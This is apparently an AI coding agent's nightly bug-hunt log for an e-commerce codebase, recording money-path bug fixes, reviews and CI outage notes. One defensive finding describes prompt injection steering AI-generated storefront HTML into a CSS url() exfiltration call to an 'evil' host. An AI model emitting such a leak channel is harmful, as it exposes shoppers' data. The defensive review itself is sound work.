- **#393 Weather (CLEAN):** `ForecastMap` extraction is behavior-preserving (internal `views.length===0 → null` mirrors the old inline `? … : null`); JSX fragment balanced. `.mapcn maplibregl-popup-content/tip` CSS is scoped to `.mapcn`. The `weather_suggestion` restore migration `20260707190004` is idempotent `create table if not exists` + `add constraint`/`create index if not exists`, already applied to prod; on a fresh checked-in-migration run the ORIGINAL create migrations run first and this is a no-op (the drop migration `…185335` is NOT checked in), so no double-create/policy loss. Not a bug.
- **#394 Campaigns (CLEAN):** `creativeEmptyText` is pure + correctly ordered (loadError → loading → non-Meta platform note → Meta-disconnect → no-creative); platform check precedes metaConnected so Google/TikTok never sees "Connect Meta". Meta-only header tools (Regenerate/Push to Meta) gated behind `isMeta`; pause/resume/cut-budget stay (route through the platform adapter). Well-tested.
- **#396's 5 fixes** — all verified correct (above). No remaining `.includes(` on the affinity/merchandising path; no other mis-netting refund-state consumer.

### Gate / environment
- `npm ci` exit 0. Fixer ralph-looped green on the first pass. Final tree (`320fe6e`): setup 0 · typecheck 0 · lint 0 (13 pre-existing warnings in untouched test files, none on touched) · build 0 (verifier: **264** client files clean) · vitest **634 files / 4790 passed / 12 skipped / 0 failed**.
- **CI runner-infra outage CONFIRMED still present on #397 (NOT a code regression).** GH-Actions `CI` (Node gate + Python engine tests) failed on #397 (SHA `320fe6e`). Signature identical to prior nights: whole run `started→completed in ~39s` (far too short to run npm ci+typecheck+lint+build+test); **the Python engine tests job ALSO failed** though our change is TS-only (can't touch Python); `get_job_logs return_content=true` → the blob download 404s (job produced no logs = runner never executed); TWO Node-gate attempts (`28996306851`, `28996328143`) both failed identically in seconds. Meanwhile **Vercel built + DEPLOYED this exact SHA (Ready)** and the LOCAL gate is fully green → authoritative. Did NOT re-kick (no code change turns runner-infra green). Posted ONE evidence-backed diagnosis comment on #397 so the maintainer doesn't chase a phantom regression.
- `get_job_logs` metadata (job list + logs_url) now RETURNS, but downloading the log CONTENT still 404s — so you can distinguish "never ran" via run DURATION (~seconds) + the Python job co-failing, not just the 404.
- `gh` CLI STILL absent — use GitHub MCP (`mcp__github__*`). `list_pull_requests` full-body can overflow (~93k) → `minimal_output:true`. `actions_get` uses `resource_id` (not `run_id`) with `method:"get_workflow_run"`.
- **Stop-hook `stop-hook-git-check.sh`** warns on uncommitted changes when a background FIXER subagent is mid-edit on the SHARED checkout — do NOT commit the fixer's in-progress file yourself (races its single-commit flow); wait for the fixer's completion notification.


## 2026-07-08

### Triage — ~192 commits (`3a2f3af`..`db67e73`); a GENUINE companion nightly PR #391 existed
Huge batch since last night's base `3a2f3af`: **SEO/Search subsystem** (seo_page/seo_settings, sitemap/robots/
llms.txt, "Get found on Google" helper — NOTE the GSC OAuth + `cron.seo-rankings` + rankings-sync (Plan C) were
ADDED then RIPPED OUT same window by `eaefb22`, so that whole OAuth/cron risk surface is MOOT — don't hunt it);
**weather merchandising** (region_weather table + boostByWeather + cron.weather-merch + visitor-geo weather +
1758-line mapcn-map.tsx/maplibre dep); **storegen** AI-HTML store builder (shaders/GSAP fx, design-model picker,
attachments); **native inventory ledger + checkout gating**; **analytics refund netting**; auth/verify hardening;
ad-connect instant ingest. Fanned out **5 read-only bug-hunters** (money/inventory · SEO/GSC · weather/storefront
· storegen · auth/ads) + **1 verifier of companion PR #391**. 3 clusters → NONE; **2 real landed bugs fixed** →
**PR #392** (draft), branch `fix/nightly-2026-07-08`, commits `b053b71` · `2f0e2a7`.

- **Companion nightly PR #391 (author Mezoh, base == our main `db67e73`) was GENUINE** — 6 fixes, ALL verified
  correct end-to-end (commerce.server UPPERCASE `IMPORTED_SALE_STATE_FILTER` for GraphQL-migrated financial_status
  + PostgREST case-sensitivity; backfill migration seeding inventory_balance for pre-ledger native variants;
  refund emitNativeRefundFact channel='test' skip; affinity substring→word-prefix; confirmation getCartState
  guard; weather-forecast cache LRU-bound). Posted a review comment: confirmed the 6 correct + flagged the ONE
  adjacent miss (see bug #2 below, which our PR #392 fixes) + an affinity test-gap nit.

### Bug #1 fixed — same-day PARTIAL refund vanishes from the live "Sales today" snapshot
- **`app/lib/dashboard/live-analytics.server.ts`** `buildLiveSnapshot`. Regression from `07aee9a` (refund now
  stamps `orders.financial_status='partially_refunded'|'refunded'`). The live snapshot filters
  `.eq("financial_status","paid")` and sums GROSS `total_cents` with NO netting → a same-day order given a partial
  refund flips out of the `paid` filter and drops ENTIRELY: full gross gone from `total_sales_today_cents`,
  `orders_today` decrements, lines/session leave `top_products`/`purchased_sessions`. $100 order + $10 partial =
  should net $90, showed $0. Fix: mirror the reviewed 30-day model (`commerce.server.ts`) — filter
  `.in(["paid","partially_refunded","refunded"])` (keep sale in gross) + subtract today's native refunds
  (`refund_fact.subtotal_cents`, `external_id like gid://calderyn/%`, `processed_at>=todayStart`). Full refund nets
  to 0; partial nets its actual cents.
- **Lesson (a `financial_status`/`state` stamp added for one consumer breaks another that filters on it):** when a
  commit starts writing a NEW status value (partially_refunded) so surface A stops over-counting, audit EVERY
  reader that filters on that column. A reader doing `.eq(col,"paid")` + GROSS-sum silently DROPS the newly-stamped
  row instead of netting it. Same family as 2026-07-06's DTO-narrowing-breaks-consumer, at the write→reader seam on
  the money path. The correct pattern already existed in the 30-day model — mirror it, don't invent netting.

### Bug #2 fixed — `imported_refund` paging miscounts at the 1000-row boundary (no stable tiebreak)
- **`app/lib/analytics/commerce.server.ts`** `readWindowImportedRefundCents`. Paged `imported_refund` (cap 10k)
  ordered ONLY by `processed_at desc`, no unique secondary sort → rows sharing a `processed_at` at a 1000-row page
  boundary can be skipped/duplicated → wrong refund total → wrong NET sales on the migrated-order money path. Fix:
  add `.order("id", { ascending: true })` (imported_refund.id is the uuid PK). This is the SAME class #391 fixed in
  the two sibling readers (`readWindowImportedOrders` already had it; #391 added it to `readWindowNativeRefundCents`)
  — #391 left the THIRD reader inconsistent. Deliberately did NOT touch `readWindowNativeRefundCents` (disjoint hunk;
  #391 owns it) so the two PRs don't conflict.
- **Lesson (paged-read stable tiebreak is a house invariant here):** every `readPaged(...).order(nonUniqueCol)` in
  this codebase MUST add `.order("id")` as a secondary sort, or it skips/dupes across the 1000-row clamp. When a
  companion PR fixes this for SOME readers in a file, grep the file for the remaining `.range(`/`readPaged` callers
  ordered by a non-unique column and check them all — they travel in packs.

### Found but NOT auto-fixed (surfaced in PR #392 / carried from #391 — act on these if they recur)
- **Storegen create-before-generate ordering is inert + comment is FALSE** (`dashboard.api.store.tsx` ~L242): the
  "add-as-products AND use-as-reference" path creates products as `status:"draft"` then runs `generateStore`, with a
  comment claiming "the generator re-reads the catalog, so the new drafts land in the snapshot it designs around."
  But `generateStore` reads the **active-only** owned catalog (`catalog.owned.server.ts` `.eq("status","active")`),
  so the drafts are excluded — the design ignores the new items and they can't render on the public grid until
  activated. Not fixed: honest fix is a comment correction OR a behavior change (activate/feed ids) that shouldn't
  ship unattended. LOW severity (drafts are private by design).
- #391's own deferred list (do not re-fix, maintainer call): `account.updated` webhook has no event-ordering guard
  (connect.server.ts — a stale/redelivered snapshot can regress charges_enabled true→false); checkout retry
  (storefront.checkout.tsx:274 createCheckout) stacks 30-min stock holds; cron.weather-suggest 1000-row clamp skips
  shops at scale; already_armed guard races the execute-sweep; storegen streaming fallback always 429s (both paths
  call assertCanGenerate, checkAiQuota consumes the 20s cooldown on the first); preview iframe sandbox widened to
  allow-same-origin+allow-scripts (dashboard-preview ONLY — public storefront still frame-ancestors 'none', so NOT a
  public XSS hole); `updateProduct` (catalog.server.ts:469) doesn't reconcile the ledger on an existing-variant
  inventory_on_hand edit.

### False positives cleared this run (do NOT re-flag)
- **SEO subsystem (whole cluster CLEAN):** every live table (seo_settings, seo_page, seo_ai_crawl_daily + log_ai_crawl
  RPC) has a migration + shop-scoped RLS; onConflict targets match real unique indexes; sitemap `<loc>` xmlEscaped,
  robots from a fixed bot list, google-site-verification through `cleanGoogleToken` (capped 200) via a Remix meta
  descriptor (HTML-escaped); sitemap capped at MAX_STOREFRONT_PRODUCTS=250 (no 1000-clamp truncation); api.search
  has requireSameOrigin+requireDashboardSession, shop from session, no `.server` leak into Search.tsx; the
  "self-heal token on read" is a pure in-memory `cleanGoogleToken`, NOT a loader-side write. `seo_ranking`/
  `seo_google_credential`/`gsc_*` columns are now DEAD schema (Plan C removed) — harmless.
- **Weather merch (CLEAN):** region_weather has a migration + service-role-only writes; cron.weather-merch
  idempotent (upsert on 4 global rows) + surfaces Open-Meteo errors (502); boostByWeather is a pure stable
  partition (never drops/dupes, output length == input); listProducts capped at 250 (no pager); missing
  region_weather → `.maybeSingle()` → "neutral" (fails safe, no storefront 500); visitor geo from spoofable
  x-vercel-ip-* headers but only drives cosmetic ordering (presence-guarded, no `Number(null)===0` trap);
  mapcn-map.tsx is React.lazy'd, no `.server` import, no provenance/postMessage/HMR markers.
- **Storegen security (CLEAN):** every rawHtml write goes saveDraft→sanitizeDocHtml→sanitizeStoreHtml (double-
  sanitize invariant holds); fx channels are safe on the PUBLIC storefront (data-fx-shader = GPU-sandboxed WebGL,
  4000-char cap, CSS fallback; data-fx-motion = boundary-validated reject-don't-coerce, filter/clipPath capped CSS
  strings, not executable); the widened script-src+allow-scripts sandbox is scoped to `/dashboard/store/preview`
  ONLY (public storefront falls through to frame-ancestors 'none'); attachments media-type allowlisted at route +
  toBase64ImageBlock, never persisted into rawHtml; single AI-quota charge per generation, retries can't mint
  duplicate drafts (client only offers Try-again when gotReceipt===false). Store.tsx ships a browser-visible
  "Add Anthropic credits" string — borderline hygiene but reads as real product copy about a feature failure; the
  verifier only bars "generated by claude"-style provenance markers, so it does NOT trip. Not a bug.
- **Auth/ads (CLEAN):** return_to always validated via `safeDashboardReturnTo` (rejects //, \, ://, control chars)
  at every sink incl. re-validation on the onboarding action; verify-on-POST is genuinely single-use (atomic
  `update .is("used_at",null)`), GET uses non-consuming peek; `069f2e7` sets email_verified:true only DOWNSTREAM of
  the Path-2 `if(!emailVerified)` guard (does NOT regress the hijack protection); ad ingest-at-connect is idempotent
  with cron (upsert onConflict shop_id,platform,external_id + campaign_id,day); google v23 camelCase/`snakeKeysDeep`
  mapping correct; meta reject-zero-accounts fails closed; billing/demo-reset/verify rate-limit helpers sound
  (Math.max(0,count-1) no underflow). Non-atomic read-then-decrement on the fail-open limiters = negligible.
- **#391's 6 fixes** — all verified correct (see above). Bundled `.order("id")` add to readWindowNativeRefundCents
  is valid (refund_fact has uuid PK).

### Gate / environment
- `npm ci` exit 0. BOTH fixes ralph-looped green on iteration 1. Final tree (`2f0e2a7`): setup 0 · typecheck 0 ·
  lint 0 (13 pre-existing warnings in untouched test files, none on touched) · build 0 (verifier: **264** client
  files clean) · vitest **632 files / 4782 passed / 12 skipped / 0 failed**.
- **CI STILL RED on `main` (runner infra, NOT code)** — same as 2026-07-07. GitHub Actions `CI` (jobs `Node gate` +
  `Python engine tests`) fails on `main` tip `db67e73`, on feature branches, on #391's branch, AND on our #392 —
  `get_job_logs` returns **HTTP 404** (runner never executed). Do NOT treat #392's red CI as a regression; the LOCAL
  gate is authoritative. Did NOT re-kick (no code fix turns runner-infra green). Documented the caveat in the #392 body.
- **Vercel preview DID build+deploy** for #392 (Building→Ready/DEPLOYED) — so the app builds on Vercel even while
  GH-Actions CI infra is down. Routine bot comment, no action.
- `gh` CLI STILL absent — use GitHub MCP (`mcp__github__*`). `list_pull_requests` full-body output overflows the
  tool-result cap (~93k chars) → it saves to a file; use `minimal_output:true` or parse the saved file. `actions_list`
  needs `method:"list_workflow_runs"` and also overflows → parse the saved file with python.

## 2026-07-07

### Triage — 96 commits (`c11d629`..`3a2f3af`); a GENUINE companion nightly PR #353 existed
Big feature batch: **weather-reallocation** (brand-new money path — forecast-driven ad-budget moves), storegen
AI-authored HTML pipeline, go-live cutover **test-transaction** probe, migrated-Shopify **analytics folding**,
Orders-view rewrite (merge imported orders), asset-rehost sweep, Autopilot explainable action cards. Fanned out
**5 read-only bug-hunters** (weather money path · storegen HTML/security · orders+commerce · autopilot+payment/
cutover · assets/import/oauth/misc) + **2 open-PR reviewers** (#351, #352). **4 real landed bugs fixed** →
**PR #354** (draft), branch `fix/nightly-2026-07-07`, commits `16b4dbb` · `bd2e300` · `d478fde` · `0ed7ca6`.

- **Companion nightly PR #353 (author Mezoh, base == our main `3a2f3af`) was GENUINE** — 6 fixes, all verified
  correct: commerce.server test-probe `channel='test'` exclusion + imported-refund keyed to parent-order window
  + native-only per-day conversion; rehost paged sibling read (1000-clamp) + attempts-bump on post-store update
  failure; sanitize-html `</style/` (solidus/whitespace-terminated) parser-differential XSS + scope @import/
  expression strip to `<style>` blocks; open-meteo skip a location missing the daily series; NULL narrative→"";
  customers loader degrades weather to empty. Posted **NONE** and hunted for what #353 MISSED (found bugs #3, #4
  below that #353's `orders`-table-only channel fix does not reach).

### Bug #1 fixed — weather budget DOUBLE-MOVE on apply-retry (money path)
- **`app/routes/dashboard.api.weather-reallocation.tsx`** (`bd3d3bd`/#343). `executeReallocation` reduces the
  source + raises the dest budget ON-PLATFORM (reallocate.server.ts:122-149) BEFORE `insertAuditWithIdempotency`
  writes the `action_idempotency` row. If the `action_audit` insert throws (`iErr`, execute.server.ts:186 — a
  Supabase blip), the budget is already moved but NO idempotency record exists; the route's `catch` released the
  row to `pending` → merchant re-approval re-claims, `priorExecutionForKey` finds nothing → budget moved AGAIN.
  Fix: catch → `setStatus("failed")` (matching the `outcome==='failed'` branch); next cron re-suggests.
- **Lesson (mutate-then-record ordering):** any executor whose idempotency marker is written AFTER the external
  side effect must treat a POST-MUTATION throw as TERMINAL, not retryable. An error handler that "releases back
  to pending / retryable" on a blanket catch double-executes when the throw lands between the mutation and the
  idempotency write. Same family as a partial-failure retry, at the executor↔route seam.

### Bug #2 fixed — weather move funded from a region with NO forecast
- **`app/lib/actions/weather-suggest.server.ts`** `buildSuggestion` (`a2baf26`/#343). Ranked every campaign
  region by `scores.get(r) ?? 0`; a region with eligible campaigns but no forecast entry (Open-Meteo returned
  fewer locations, or — post-#353 — the location was skipped for a missing daily series) defaulted to score `0`
  (the minimum) → chosen as the SOURCE whose budget is cut, moving real money on a forecast we don't have.
  `scores` is built only from `forecasts`; `byRegion` from campaigns — they can diverge. Fix: `filter(r =>
  scores.has(r))` before ranking, re-check the ≥2 minimum. Also surfaced a swallowed `guardrail_config` read
  error (cron isolates per-shop via mapWithConcurrency, so throwing fails just that shop).
- **Lesson (`map.get(x) ?? DEFAULT` where DEFAULT is a meaningful extreme):** `?? 0` conflates "missing" with
  "genuinely lowest" — a decision keyed on the value silently acts on ABSENT data as if it were the worst case.
  Filter to keys actually present before ranking/deciding. Note #353's open-meteo skip made this MORE reachable.

### Bug #3 fixed — uncaptured migrated orders inflate analytics window totals
- **`app/lib/analytics/commerce.server.ts`** `readWindowImportedOrders` (`5843300`/#347). Folded EVERY
  `imported_order` in the window (only a `processed_at` filter) into gross / per-day gross / order count / the
  Shopify channel total, while the NATIVE reader restricts to `SALE_STATES`. `imported_order.financial_status`
  carries Shopify vocab incl. `pending`/`authorized`/`voided`/`expired` (money never captured; all enumerated in
  Orders.tsx `IMPORTED_STATUS`) → counted as revenue with no offsetting sale. Fix: `.in("financial_status",
  ["paid","partially_paid","partially_refunded","refunded"])` + stable `.order("id")` tiebreak (pagination across
  the 1000-clamp). #353 also edits this reader (adds `id` to select) — non-conflicting hunks.
- **Lesson (folding a 2nd source into a native aggregate):** every filter the native side applies (sale-state,
  channel, stable tiebreak) MUST be mirrored for the imported/migrated source in ITS OWN vocabulary. A dropped
  status filter on the newly-folded source silently overstates the combined total.

### Bug #4 fixed — go-live TEST PROBE leaks into warehouse revenue
- **`app/lib/order/emit.server.ts`** `emitPaidOrder` (`1b75d98`/#339). The 50c cutover probe is a real
  `channel='test'` order that reaches `paid` then is refunded. `channel` exists ONLY on `orders`, NOT on
  `order_fact`; #353's `channel='test'` commerce-analytics exclusion operates on `orders` and can't reach the
  emitted `order_fact` row → probe permanently inflates warehouse revenue / order count / AOV (refund emits a
  `refund_fact` but leaves the `order_fact` row). Fix: `emitPaidOrder` selects `channel`, early-returns skipped
  for test orders (mirrors the existing state!='paid' self-heal skip).
- **Lesson (a "test/synthetic" flag on ONE table doesn't propagate to derived tables):** an exclusion built on a
  flag only covers the table that HAS the flag. When a probe/test row rides the real checkout→webhook→emit path,
  audit EVERY downstream consumer keyed off derived tables (`order_fact` revenue, `buyer_dim` count) — #353 fixed
  the `orders`-based commerce view but NOT `order_fact` (bug #4) or `buyer_dim` (surfaced below).

### Found but NOT auto-fixed (surfaced in PR #354 for a maintainer call) — act on these if they recur
- **Public-storefront CSP has NO resource directives** (`app/entry.server.tsx`, non-embedded branch): only
  `frame-ancestors/object-src/base-uri/form-action/upgrade-insecure-requests` — no `default-src`/`img-src`/
  `style-src`/`connect-src`. The HTML sanitizer intentionally passes CSS `url()` through, justified by a comment
  claiming it's "blocked by the storefront CSP" — that is FALSE. AI-authored storefront HTML is grounded in
  untrusted catalog text + merchant brief (prompt-injection surfaces), so a coerced `url(https://evil/?leak=…)`
  is a client-side exfil/tracking channel with no net. **Why not fixed:** a CSP tightened without the storefront's
  legit resource origins (rehosted Supabase images, fonts) could break the public storefront for all merchants —
  needs a runtime-verified allowlist. **Lesson: when a sanitizer defers a vector "to the CSP", verify the CSP
  actually carries that directive.**
- **Go-live probe also inflates `buyer_dim`** (`app/lib/cutover/test-transaction.server.ts`): `upsertGuestBuyer`
  writes a real `buyer_dim` row (`test-probe@calderyn.internal`); the buyer directory counts it with no channel
  filter and `refundTestOrders` never removes it → permanent phantom customer. Same root as bug #4. Product call.
- **Orders "of N" total mixes counts** (`Orders.tsx`): `ordersTotal = native(capped 100) + imported.totalCount`
  undercounts once native > 100. Needs a native `count()` query (UX decision), not surgical.
- **Storegen `<style>` selector scoping not enforced** (defense-in-depth) — non-trivial CSS-scope rewrite.

### False positives cleared this run (do NOT re-flag)
- **Autopilot explainable action cards (#348):** `money()` takes cents; `rowToAlert` converts DB dollars→cents at
  the boundary; the money verb is cosmetic framing over a positive magnitude (no sign/direction error);
  `reasonLines` never hides a real reason; the approve path is unchanged (JSX-only diff) + guarded. Clean.
- **Assets rehost (beyond #353's 2 fixes):** dedup-before-rehost ordering correct; `(product_id, external_url)`
  partial unique prevents identical-hotlink double-rehost; `storeImageBytes` removes its blob if `asset_dim`
  insert fails. Clean.
- **Import protected-customer-data denial (#337):** the `pulling` flag scopes the broadened `blocked` classifier
  to the customer pull ONLY; a genuine token revocation throws earlier in `backfillShop`; run marked `done` with
  an honest "customers not-yet-available" report (documented intent, not hidden partial-success). Clean.
- **OAuth shop-less restore (#335):** callback still enforces HMAC + nonce + valid shop + code exchange; the `*`
  sentinel only relaxes the shop-pin; `__Host-` state cookie host-locked (anti-fixation); `return_to`
  re-sanitized via `safeDashboardReturnTo`. No bypass/CSRF/open-redirect. Clean.
- **AI-quota dev/allowlist bypass (#340):** `NODE_ENV==='development'` can't fire in Vercel prod or vitest;
  allowlist exact trimmed match, empty env = every shop capped. Fail-safe. Clean.
- **Discover subtab (#329):** `requireSameOrigin` + `requireDashboardSession`, shop from `session.shopId`. Clean.
- **`checkout.session.completed` reconcile (stripe.server.ts):** only upserts `payment_intent` (onConflict), no
  ledger/count, redelivery = pure no-op; the money-moving `payment_intent.succeeded` path stays dedup-gated on
  `record_stripe_event`. New cutover route auth is `requireSameOrigin`+`requireDashboardSession`, shop from
  session. Clean.
- **Storegen sanitizer/levers (beyond #353):** no bypass beyond the fixed `</style/`; `typeStyle`/`density`
  whitelisted with safe defaults at every boundary (parseBrandPlan, getStoreSettings, render re-default); every
  rawHtml write sanitized (saveDraft, generator double-sanitize, experiment `variant_doc`); no `.server` leak
  into `Store.tsx`; 0-product path guarded (`skipLlm`/`fallbackDoc`). Clean.
- **PR #352 (weather segments v2 — unattended armed predictions):** armed exec atomically claims the row before
  any budget move; `idempotencyKey weather:${row.id}` shared with the manual path; disarm vs claim are mutually
  exclusive conditional updates; alerts-mirror select-then-insert avoids ON-CONFLICT-against-partial-index 42P10.
  Reviewed money path end-to-end → NONE.

### Open-PR review this run
- **#351** (last-mile merchant-flow fixes, author Mezoh): posted ONE comment — the update path still writes the
  flat `inventory_on_hand` for an EXISTING variant WITHOUT reaching the ledger (`seedInitialStock` only in the
  new-variant branch), so now that the ledger is authoritative for sellability, the editor's editable stock field
  silently does nothing. The 3 fixes themselves are sound (C2 `inventory_adjust` absolute upsert = no inflation;
  C3 recommendation narrowing; M6 `org_slug` threading).
- **#352** (weather segments v2): NONE (see above). **#353** (companion nightly): 6 fixes correct → NONE.

### Gate / environment
- `npm ci` exit 0, Node v22.22.2. Full gate on fix tree (`0ed7ca6`): setup 0 · typecheck 0 · lint 0 (touched,
  `--max-warnings=0`) · build 0 (verifier: **252** client files clean) · vitest **589 files / 4345 passed / 12
  skipped / 0 failed**.
- **NEW — CI is RED on `main` itself:** the GitHub Actions **`CI`** workflow (jobs **`Node gate`** + **`Python
  engine tests`**) fails on EVERY recent main commit including the tip `3a2f3af` (our base), with EMPTY output +
  **404** job logs → the runner isn't actually executing (env/secrets/self-hosted-runner issue, not code). Do NOT
  treat a red CI on the nightly PR as a regression — it's red on main too. Rely on the LOCAL gate (authoritative).
  Diagnose pre-existing-ness via `actions_list list_workflow_runs {branch:"main"}` and compare conclusions.
  Documented on PR #354; did NOT re-kick (no code fix turns a runner-infra failure green).
- `gh` CLI NOT available — use GitHub MCP (`mcp__github__*`). `get_job_logs` 404s and `get_check_run` returns
  empty output for these failing jobs. Vercel bot: routine Building→Ready preview-deploy comment (no action).


## 2026-07-06

### Triage — 38 commits since last night's base `89059ad`; a GENUINE companion nightly PR #326 existed
Window = the 2026-07-05 feature batch merged after last night's `89059ad` base: viral sourcing #17 backend
(`233ebf7`), store studio v2 #315, ai-quota #312, self-service account deletion #323, onboarding import step
#324, apex-proxy CSRF patch #321/#322, owned-inventory-without-Shopify #320, autopilot per-feature toggles
#318, tenant-domain autoregister #313, prompt hardening #314. Fanned out **4 read-only bug-hunters** (auth/
onboarding/delete/CSRF · store-studio/AI/quota · owned-inventory+autopilot money-path · viral-sourcing
backend) + **2 open-PR reviewers** (#325, #326). 2 clusters → NONE; **2 real landed bugs fixed**. Shipped
**PR #327** (draft), branch `fix/nightly-2026-07-06`, commits `c82eb5c` + `4c1d166`.

- **Companion nightly PR #326 (author Mezoh, base == our main `c11d629`) was GENUINE.** Its body claimed
  "No commits landed in the last 24 hours" — that claim is UNRELIABLE (38 commits landed since `89059ad`),
  but #326 broadened scope anyway and did cover the viral-sourcing backend + store.preview. Re-derive the
  window from `git log 89059ad..HEAD` (last night's base) yourself; don't trust the "zero commits" line.

### Bug #1 fixed — main was RED on typecheck (a #310 regression)
- **`app/routes/dashboard.store.preview.tsx`** (#310 / `c11d629`). #310's "don't leak shop_id" DTO fix narrowed
  the loader payload to `{storeName, logoUrl, palette}`, but the component reads `settings.vibe` (line 65) for
  the `[data-vibe]` styling hook → `tsc --noEmit` failed repo-wide (TS2339 `Property 'vibe' does not exist`)
  AND the framed draft lost the merchant's vibe. Fix: re-add `vibe: settings.vibe` to the DTO (shop_id stays
  omitted). Companion PR #326's fix #1 is the identical fix — carried it as a **focused single-commit unblock**
  in our own PR so main can go green immediately without adopting #326's bundled sourcing changes.
- **Lesson (DTO narrowing breaks the consumer's typecheck):** a "don't-leak-internal-fields" DTO fix that
  narrows a loader payload must be cross-checked against EVERY field the component reads off
  `useLoaderData<typeof loader>()` — a dropped *visible* field both degrades the UI AND breaks tsc repo-wide.
  Same family as the write-then-blank round-trip drop, but at the loader→component boundary. Also: a companion
  nightly PR fixing "main is red" does NOT help main until merged — carry the unblock in your own focused PR.

### Bug #2 fixed — storefront A/B exposure attributed to the WRONG visitor on a first-ever visit (#315)
- **`app/routes/storefront._index.tsx` + `app/lib/storefront/events.server.ts`** (#315 / `0efb200`, store-studio
  v2 A/B experiments). First-ever visitor (no `cd_vid` cookie) mints the visitor session TWICE: the loader
  mints id#1 and buckets the served home doc + the exposure `page_view` row's `variant_key` off
  `assignArm(id#1)`, then `trackStorefrontEvent` calls `ensureVisitorSession(request)` AGAIN on the still-
  cookieless request → `randomUUID()` mints id#2; the loader returns id#2's Set-Cookie so the BROWSER persists
  id#2 and the exposure row's `visitor_id`=id#2 while `variant_key`=arm(id#1). Every later request reads id#2 →
  order attribution keys off `assignArm(id#2)`, independent of the arm actually served → ~50% of first-session
  visitors split exposure vs conversion across arms, biasing the experiment report and ship/keep/stop calls.
  The inline comment claimed "bucketing settles on the second page view" — it's actually a first-page
  exposure/attribution SPLIT. Fix (surgical): thread the single already-minted `VisitorSession` into
  `trackStorefrontEvent` (optional 5th param `session?`; `const s = session ?? await ensureVisitorSession(request)`;
  return `s.headers`); product/checkout callers pass no session → unchanged. Added an events.server test
  (passed session not re-minted) + extended the home-experiment test (exposure row visitorId == bucketing id).
- **Lesson (double-mint identity across a loader→emitter seam):** when a loader derives a "read-or-create"
  identity (visitor/session id via its own `ensureX(request)`) for a DECISION (A/B bucketing) and a downstream
  side-effecting helper re-derives the SAME identity independently, a first request with no persisted cookie
  mints two different ids — the one the decision used and the one persisted/recorded diverge. Any
  read-or-create-identity helper must be called ONCE per request and threaded, never re-derived downstream.

### Open-PR review this run
- **#325** (viral-sourcing discovery UI, author keyuchen1735-boop): posted ONE high-confidence bug —
  `pickProduct` (`discover.server.ts`) is NOT idempotent: the `unique(shop_id, product_id)` constraint added on
  `sourced_product_link` can never fire because `createProduct` mints a fresh `product_id` each pick (random
  handle bytes); there is no `unique(shop_id, source_product_id)`. Product+media+link are persisted BEFORE
  `generateStore` with no txn, so a `generateStore` throw returns 500 while the product already exists → retry
  duplicates the catalog + re-runs generateStore; a re-pick also duplicates. Fix: `unique(shop_id,
  source_product_id)` + short-circuit/upsert on that pair. Plus minor notes: `listDiscoverFeed` has no
  tiebreaker (score-only order, 0–100 integer buckets → nondeterministic ties); demo/reset `SHOWCASE_WIPE_ORDER`
  omits `sourced_product_link` (orphan rows, no FK cascade); `source_product_signal` `.insert()` (not upsert)
  each ingest = audit bloat but **write-only (nothing reads it back) → NOT a correctness bug**.
- **#326** (companion nightly, author Mezoh): GENUINE, 5 fixes — vibe DTO; sourcing real-decay via `first_seen_at`;
  sourcing swallowed-write→throw; CJ range-price NaN→low-end; discover supplier embed array-normalize. Reviewed
  all 5 → correct (decay 86.4M ms/day units; `first_seen_at` NOT in the upsert payload so preserved on re-ingest;
  `scored++` not double-counted; CJ handles range/single/empty/non-numeric; embed unwrap mirrors `pickProduct`).
  Posted NONE.

### False positives cleared this run (do NOT re-flag)
- **Account deletion #323:** `deleteAccount` takes userId/shopId from session ONLY, sole-member guard by shop_id
  fails safe, service-role (BYPASSRLS) client so deletes apply, user-first then shop, gated by requireSameOrigin
  + allow-unverified session + first-party + server-revalidated `confirm==="DELETE"` + per-user rate-limit,
  `authClearCookieHeaders` tears down all auth cookies. Clean.
- **Onboarding enforcement #324:** `needsOnboarding` enforced at shell (requireVerifiedSession), APIs
  (requireDashboardSession→403), Google callback (afterAuth), dashboard.connect loader; action guards
  replayed/already-onboarded (409/redirect), requires saved contact before completeOnboarding, validates
  return_to via safeDashboardReturnTo, same-origin; no redirect loop; the Path-2 unverified-merge hijack
  protection (`if (!emailVerified)`) is INTACT — #324 did NOT regress it. Clean.
- **CSRF apex-proxy patch #321/#322:** the `patches/@remix-run+server-runtime` patch only early-returns (skips
  the Remix throw) when `Origin` is in the SAME env allowlist `checkSameOrigin` uses (DASHBOARD_PUBLIC_URL /
  SHOPIFY_APP_URL / DASHBOARD_ALLOWED_ORIGINS); untrusted origins still throw; Origin is not browser-forgeable;
  requireSameOrigin stays authoritative on writes; fails closed on an empty allowlist. Clean.
- **Owned-inventory-without-Shopify #320 + cutover org-mode (`c9235df`):** `getOrgMode` + `shopHasShopifyConnection`
  throw on Supabase error AND on missing shop (fail-CLOSED); `owned = !hasShopify || writesToOwned(orgMode)` only
  reaches the owned engine when the DB confirms no shop_domain; native shop → owned=true so `admin` (null) never
  deref'd; genuine Shopify-required paths throw `shopify_required` (not a silent no-op); adjust-price owned/Shopify
  branches mutually exclusive (no double authoritative write); RelocationError rethrow only for SHOPIFY_REQUIRED
  (real failed moves still hit the `outcome="failed"` audit). Clean.
- **Autopilot per-feature toggles #318:** each row toggles by its own `{detectorId, actionKind}`, keyed
  `${detectorId}:${actionKind}`, `on` initializes from `row.enabled` (unlocked) / `false` (locked) — no
  cross-feature write, no default-ON. Clean.
- **Store-studio/AI cluster #315/#312/#314/#313:** ai-quota scoping/off-by-one/cooldown correct + fail-open
  documented-intentional; `assignArm` deterministic; commerce tool validation sound; `readPaged` caps are
  1000-multiples (no partial-window early-return); Vercel domain register best-effort, never blocks provisioning;
  no `.server` leak; prompt-injection hex defense holds. (The A/B double-mint above was the ONE real find here.)
- **Viral-sourcing score math:** cannot go NaN/negative or exceed 100; ingest column names + onConflict targets
  match the migration DDL; pick path shop-scoped; no sourcing table is referenced by a wipe path lacking a
  migration (the PGRST205 class from 2026-07-05 does NOT recur here).

### Gate / environment
- `npm ci` again WORKS (exit 0), Node v22.22.2. Full gate on the fix tree (`4c1d166`): setup 0 · typecheck 0 ·
  lint 0 (13 pre-existing warnings, 0 errors, none on touched files) · build 0 (verifier: **245** client files
  clean) · vitest **573 files / 4207 passed / 12 skipped / 0 failed**.
- Vercel bot posts the routine "Building"→"Ready" preview-deploy comment on every nightly PR (twice: PENDING
  then DEPLOYED) — NOT a review comment, no action.

## 2026-07-05

### Triage — ~40 commits (PRs #302–#309 + demo-showcase merge); a GENUINE companion nightly PR existed
Window = merged 2026-07-04 on `main` `89059ad`: signup onboarding (#305), demo showcase account +
